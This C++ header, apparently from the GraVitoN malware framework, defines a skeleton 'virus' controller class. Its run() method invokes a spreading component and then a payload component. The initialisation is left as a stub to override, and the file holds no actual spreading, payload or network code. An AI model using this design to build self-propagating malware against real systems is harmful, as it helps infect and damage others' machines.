/**
 * @file
 *
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief A very simple trojan-AI
 *
 */

#ifndef _GVN_AI_VIRUS_SAMPLE_HEAD_
#define _GVN_AI_VIRUS_SAMPLE_HEAD_

#include "gvn_ai.hpp"
#include "../gvn_spread/gvn_spread.hpp"
#include "../gvn_payload/gvn_payload.hpp"
using namespace GraVitoN;

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
  * @brief A Very Simple AI component for a virus
  * @see AI_Trojan_Sample
  */
class AI_Virus_Sample : public GraVitoN::AI
{
protected:
	Payload *payload;
	Spread *spread;

protected:
	/**
	  * @brief Initialize internal components
	  */
	virtual bool initializeInternalComponents();

public:
    AI_Virus_Sample();
	virtual ~AI_Virus_Sample();

	virtual bool run();
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
AI_Virus_Sample::AI_Virus_Sample()
{
    payload = _null_;
	spread = _null_;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
AI_Virus_Sample::~AI_Virus_Sample()
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool AI_Virus_Sample::initializeInternalComponents()
{
	Logger::logItLn("[AI_Virus_Sample::initializeInternalComponents] YOU HAVE TO OVERRIDE ME!");

	return false;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool AI_Virus_Sample::run()
{
	bool suc = true;
	if( !(spread)->run() )
		suc = false;
	if( !(payload)->run() )
		suc = false;
	
    return suc;
}

#endif // _GVN_AI_VIRUS_SAMPLE_HEAD_
